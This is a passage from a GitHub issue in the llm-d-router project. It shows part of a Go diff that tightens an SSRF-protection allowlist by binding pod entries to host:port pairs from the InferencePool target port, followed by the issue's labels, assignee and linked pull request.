 	av.createPodInformer(poolName, labelSelector.AsSelector())
@@ -303,21 +334,21 @@ func (av *AllowlistValidator) createPodInformer(poolName string, selector labels
 
 	// Create new pod informer
 	podLW := &cache.ListWatch{
-		ListFunc: func(options metav1.ListOptions) (runtime.Object, error) {
+		ListWithContextFunc: func(ctx context.Context, options metav1.ListOptions) (runtime.Object, error) {
 			options.LabelSelector = selector.String()
 			return av.dynamicClient.Resource(schema.GroupVersionResource{
 				Group:    "",
 				Version:  "v1",
 				Resource: "pods",
-			}).Namespace(av.namespace).List(context.TODO(), options)
+			}).Namespace(av.namespace).List(ctx, options)
 		},
-		WatchFunc: func(options metav1.ListOptions) (watch.Interface, error) {
+		WatchFuncWithContext: func(ctx context.Context, options metav1.ListOptions) (watch.Interface, error) {
 			options.LabelSelector = selector.String()
 			return av.dynamicClient.Resource(schema.GroupVersionResource{
 				Group:    "",
 				Version:  "v1",
 				Resource: "pods",
-			}).Namespace(av.namespace).Watch(context.TODO(), options)
+			}).Namespace(av.namespace).Watch(ctx, options)
 		},
 	}
 
@@ -393,17 +424,30 @@ func (av *AllowlistValidator) rebuildAllowlist() {
 	av.logger.Info("rebuilt allowlist", "targetCount", len(av.allowedTargets), "targets", av.allowedTargets)
 }
 
-// addPodToAllowlist adds a pod's endpoints to the allowlist
+// addPodToAllowlist adds a pod's endpoints to the allowlist as host:port
+// tuples bound to the pool's target port. If the pool's target port is
+// unknown (the InferencePool resource hasn't been observed yet, or has no
+// spec.targetPorts), no entry is added — the pod will be revisited on the
+// next pool-add/update event via rebuildAllowlist.
 func (av *AllowlistValidator) addPodToAllowlist(pod *unstructured.Unstructured, poolName string) {
+	av.poolPortsMu.RLock()
+	port, ok := av.poolPorts[poolName]
+	av.poolPortsMu.RUnlock()
+	if !ok || port == "" {
+		av.logger.V(4).Info("skipping pod allowlist insert (pool target port unknown)",
+			"pod", pod.GetName(), "pool", poolName)
+		return


 	podIP, _, _ := unstructured.NestedString(pod.Object, "status", "podIP")
 	if podIP != "" {
-		av.allowedTargets.Insert(podIP)
+		av.allowedTargets.Insert(net.JoinHostPort(podIP, port))
 	}
 
 	podName := pod.GetName()
 	if podName != "" {
-		av.allowedTargets.Insert(podName)
+		av.allowedTargets.Insert(net.JoinHostPort(podName, port))
 	}
 
-	av.logger.V(5).Info("added pod to allowlist", "pod", podName, "ip", podIP, "pool", poolName)
+	av.logger.V(5).Info("added pod to allowlist", "pod", podName, "ip", podIP, "port", port, "pool", poolName)
 }
```

## Activity
[MillaFleurs](https://github.com/MillaFleurs)
added 
[needs-triageIndicates an issue or PR lacks a triage label and requires one.](https://github.com/llm-d/llm-d-router/issues?q=state%3Aopen%20label%3A%22needs-triage%22)Indicates an issue or PR lacks a triage label and requires one.
[kind/bugCategorizes issue or PR as related to a bug.](https://github.com/llm-d/llm-d-router/issues?q=state%3Aopen%20label%3A%22kind%2Fbug%22)Categorizes issue or PR as related to a bug.
[on May 3, 2026](https://github.com/llm-d/llm-d-router/issues/979#event-25113968944)
[github-project-automation](https://github.com/apps/github-project-automation)
added this to [on May 3, 2026](https://github.com/llm-d/llm-d-router/issues/979#event-25113970270)
### hexfusion commented on May 6, 2026 
Contributor
More actions
/assign
[github-actions](https://github.com/apps/github-actions)
assigned [on May 6, 2026](https://github.com/llm-d/llm-d-router/issues/979#event-25223091195)
[Sign up for free](https://github.com/signup?return_to=https://github.com/llm-d/llm-d-router/issues/979)**to join this conversation on GitHub.** Already have an account? [Sign in to comment](https://github.com/login?return_to=https://github.com/llm-d/llm-d-router/issues/979)
## Metadata
## Metadata
### Assignees
  * [hexfusion](https://github.com/hexfusion)


### Labels
[kind/bugCategorizes issue or PR as related to a bug.](https://github.com/llm-d/llm-d-router/issues?q=state%3Aopen%20label%3A%22kind%2Fbug%22)Categorizes issue or PR as related to a bug.[needs-triageIndicates an issue or PR lacks a triage label and requires one.](https://github.com/llm-d/llm-d-router/issues?q=state%3Aopen%20label%3A%22needs-triage%22)Indicates an issue or PR lacks a triage label and requires one.
No type
### Projects
  * [llm-d-router Closed](https://github.com/orgs/llm-d/projects/15)
Status
No status
Show more project fields


Show 1 closed project
### Milestone
No milestone
### Relationships
None yet
### Development
  * [ feat(sidecar): implement SSRF protection with InferencePool host-port allowlistllm-d/llm-d-router ](https://github.com/llm-d/llm-d-router/pull/1647)


### Participants
## Issue actions
  * Open in GitHub Copilot app


You can’t perform that action at this time. 
